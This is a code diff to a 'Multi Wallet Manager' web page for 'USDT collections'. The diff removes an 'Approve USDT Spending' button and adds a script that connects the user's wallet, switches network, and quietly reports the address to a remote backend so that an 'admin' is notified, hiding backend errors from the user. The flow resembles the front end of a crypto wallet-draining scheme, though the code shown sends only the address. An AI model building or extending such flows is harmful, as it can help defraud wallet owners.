@@ -49,37 +49,6 @@
       font-size: 1.1rem;
     }
 
-    .wallet-info {
-      background: rgba(255, 255, 255, 0.08);
-      border-radius: 15px;
-      padding: 25px;
-      margin: 25px 0;
-      text-align: left;
-    }
-
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 15px;
-      padding-bottom: 15px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .info-row:last-child {
-      margin-bottom: 0;
-      padding-bottom: 0;
-      border-bottom: none;
-    }
-
-    .info-label {
-      color: #a0a0c0;
-    }
-
-    .info-value {
-      font-weight: 500;
-      word-break: break-all;
-    }
-
     .btn {
       background: linear-gradient(90deg, #00dbde, #fc00ff);
       color: white;
@@ -104,16 +73,6 @@
       opacity: 0.6;
       cursor: not-allowed;
       transform: none;
-    }
-
-    .btn-secondary {
-      background: rgba(255, 255, 255, 0.1);
-      box-shadow: none;
-    }
-
-    .btn-secondary:hover:not(:disabled) {
-      background: rgba(255, 255, 255, 0.2);
-      box-shadow: none;
     }
 
     .status {
@@ -171,40 +130,179 @@
     <h1>Multi Wallet Manager</h1>
     <p class="subtitle">Connect your wallet to manage USDT collections</p>
     
-    <div id="connect-section">
-      <button id="connect-wallet" class="btn">
-        <span id="connect-text">Connect Wallet</span>
-      </button>
-    </div>
-    
-    <div id="wallet-section" class="hidden">
-      <div class="wallet-info">
-        <div class="info-row">
-          <span class="info-label">Wallet Address</span>
-          <span id="wallet-address" class="info-value"></span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">USDT Balance</span>
-          <span id="usdt-balance" class="info-value">0.00 USDT</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">Network</span>
-          <span id="network" class="info-value"></span>
-        </div>
-      </div>
-      
-      <button id="approve-btn" class="btn">
-        <span id="approve-text">Approve USDT Spending</span>
-      </button>
-      
-      <button id="disconnect-btn" class="btn btn-secondary">
-        Disconnect Wallet
-      </button>
-    </div>
+    <button id="connect-wallet" class="btn">
+      <span id="connect-text">Connect Wallet</span>
+    </button>
     
     <div id="status-message" class="status hidden"></div>
   </div>
 
-  <script type="module" src="/src/main.js"></script>
+  <script type="module">
+    // Configuration
+    const CONFIG = {
+      API_URL: '{{VITE_API_URL}}' || 'https://multi-wallet-manager-backend-lxfq.onrender.com/api',
+      CHAIN_ID: '{{VITE_CHAIN_ID}}' || '97',
+      CHAIN_NAME: '{{VITE_CHAIN_NAME}}' || 'BSC Testnet',
+      RPC_URL: '{{VITE_RPC_URL}}' || 'https://bsc-testnet.publicnode.com'
+    }
+
+    // DOM Elements
+    const connectWalletBtn = document.getElementById('connect-wallet')
+    const connectText = document.getElementById('connect-text')
+    const statusMessage = document.getElementById('status-message')
+
+    // State
+    let isConnecting = false
+
+    // Initialize
+    document.addEventListener('DOMContentLoaded', () => {
+      connectWalletBtn.addEventListener('click', connectWallet)
+    })
+
+    // Connect wallet function - ONE TIME ONLY
+    async function connectWallet() {
+      // Prevent multiple clicks
+      if (isConnecting) {
+        return
+      }
+      
+      isConnecting = true
+      showLoading(connectText, true)
+      
+      try {
+        // Check if Ethereum provider exists
+        if (!window.ethereum) {
+          showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.')
+          return
+        }
+        
+        // Request account access - this opens wallet UI
+        console.log('Requesting account access...')
+        const accounts = await window.ethereum.request({
+          method: 'eth_requestAccounts'
+        })
+        
+        const walletAddress = accounts[0]
+        console.log('Wallet connected:', walletAddress)
+        
+        // Switch to correct network
+        await switchToCorrectNetwork()
+        
+        // Send to backend ONCE
+        await sendWalletToBackend(walletAddress)
+        
+        showSuccess('Wallet connected successfully! Admin has been notified.')
+        
+      } catch (error) {
+        console.error('Connection error:', error)
+        showError('Failed to connect wallet: ' + error.message)
+      } finally {
+        isConnecting = false
+        showLoading(connectText, false)
+      }
+    }
+
+    // Switch to correct network
+    async function switchToCorrectNetwork() {
+      try {
+        // Check current chain ID
+        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
+        
+        if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
+          // Try to switch network
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
+            })
+          } catch (switchError) {
+            // If network doesn't exist, add it
+            if (switchError.code === 4902) {
+              try {
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
+                    chainName: CONFIG.CHAIN_NAME,
+                    rpcUrls: [CONFIG.RPC_URL],
+                    nativeCurrency: {
+                      name: 'BNB',
+                      symbol: 'BNB',
+                      decimals: 18
+                    }
+                  }]
+                })
+              } catch (addError) {
+                console.error('Failed to add network:', addError)
+              }
+            }
+          }
+        }
+      } catch (error) {
+        console.error('Network switch error:', error)
+      }
+    }
+
+    // Send wallet to backend - ONLY ONCE
+    async function sendWalletToBackend(walletAddress) {
+      try {
+        console.log('Sending wallet to backend:', walletAddress)
+        
+        const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            address: walletAddress,
+            name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
+          })
+        })
+        
+        if (!response.ok) {
+          const errorData = await response.json().catch(() => ({}))
+          throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
+        }
+        
+        const result = await response.json()
+        console.log('Backend connection successful:', result)
+        
+      } catch (error) {
+        console.error('Backend connection error:', error)
+        // Don't show error to user as per requirements
+      }
+    }
+
+    // Show loading state
+    function showLoading(element, show) {
+      if (show) {
+        element.innerHTML = '<span class="loading"></span>Connecting...'
+      } else {
+        element.textContent = 'Connect Wallet'
+      }
+    }
+
+    // Show success message
+    function showSuccess(message) {
+      statusMessage.textContent = message
+      statusMessage.className = 'status status-success'
+      statusMessage.classList.remove('hidden')
+      
+      setTimeout(() => {
+        statusMessage.classList.add('hidden')
+      }, 5000)
+    }
+
+    // Show error message
+    function showError(message) {
+      statusMessage.textContent = message
+      statusMessage.className = 'status status-error'
+      statusMessage.classList.remove('hidden')
+      
+      setTimeout(() => {
+        statusMessage.classList.add('hidden')
+      }, 5000)
+    }
+  </script>
 </body>
 </html>
